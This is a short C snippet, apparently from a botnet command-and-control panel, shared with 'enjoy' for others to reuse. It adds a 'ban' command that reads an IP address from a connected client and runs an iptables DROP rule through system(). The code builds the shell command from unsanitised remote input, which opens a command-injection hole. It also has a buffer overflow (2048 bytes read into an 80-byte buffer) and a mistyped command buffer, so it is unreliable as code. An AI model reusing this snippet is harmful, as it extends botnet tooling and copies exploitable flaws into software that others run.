/*
Original Snippet From [Azula]
Simple Snippet for taking user input(IP) and printing to system with a prewritten line to kill and disable any current/future connections towards a specific IP Address
Simply just a 'ban' function.
enjoy ~ Cri
*/

if(strstr(buf, "ban"))
{
    char abuf[2048]; char *inputtosystem[50]; char InputIP[80];
 
    sprintf(botnet, ""white"IP:"red" ");  /* User Input */
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; /* Send user input */
    if (fdgets(InputIP, sizeof abuf, thefd) < 1) goto end;  /* Grab User input */
    trim(InputIP); /* Trim Response */
 
    sprintf(inputtosystem, "iptables -A INPUT -s %s -j DROP", InputIP); /* Print out */
    system(inputtosystem); /* Print to system */
}
